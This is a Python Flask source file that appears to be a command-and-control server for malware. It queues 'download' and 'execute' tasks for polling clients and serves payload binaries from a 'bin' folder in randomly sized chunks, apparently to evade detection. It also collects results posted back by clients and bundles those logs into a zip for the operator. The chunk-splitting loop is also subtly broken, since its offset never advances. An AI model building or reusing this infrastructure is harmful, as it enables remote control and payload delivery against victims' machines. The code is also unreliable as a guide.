from flask import Flask, make_response, send_file, request, jsonify
import os
from collections import deque
from datetime import datetime
import shutil
import random
import time
import io

app = Flask(__name__)
queue = deque()

PAYLOADS_DIR = os.path.join(os.path.dirname(__file__), 'bin')
LOGS_DIR = os.path.join(os.path.dirname(__file__), 'logs')


with app.app_context():
    response1 = {
        'type': 'download',
        'url': 'download/test',
        'command': ""
    }
    response3 = {
        'type': 'execute',
        'url': '',
        'command': "./test"
    }
    queue.append(response1)
    queue.append(response3)
    
    

@app.route("/", methods = ['GET'])
def root():
    response = queue.popleft()
    
    # For testing
    queue.append(response)
     
    return jsonify(response)

def split_file(filename):
    filepath = os.path.join(PAYLOADS_DIR, filename)
    
    with open(filepath, "rb") as file:
        content = file.read()
        
    size = len(content)
    
    if size < 1024:
        return content
    
    i1 = random.randint(240,300)
    
    # SPLIT FILE
    chunks = [ content[:i1] ]
    
    while( size > 0 ):
        chunk_len = random.randint(min(256, size), min(10240,size))
        
        i2 = i1 + chunk_len
        
        chunks.append( content[i1:i2] )
        size = size - chunk_len
    
    return chunks

    
@app.route("/download/<filename>", methods = ['GET'])
def download_file(filename):
    chunks = split_file(filename)
    
    def generate():
        for chunk in chunks:
            # time.sleep(random.randint(1,3))
            yield chunk
    
    return generate(), {"Content-Type": "application/octet-stream"}

    
@app.route("/results", methods = ["POST"])
def save_results():
    data = request.data
    
    filename = f"{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.txt"
    
    filepath = os.path.join(LOGS_DIR, filename)
    
    with open(filepath, "w") as file:
        file.write(data.decode('utf-8'))
        
    return make_response("", 201)

@app.route("/get_results", methods = ['GET'])
def get_results():
    shutil.make_archive("logs", 'zip', LOGS_DIR)
    response = send_file("logs.zip")
    
    return make_response(response, 200)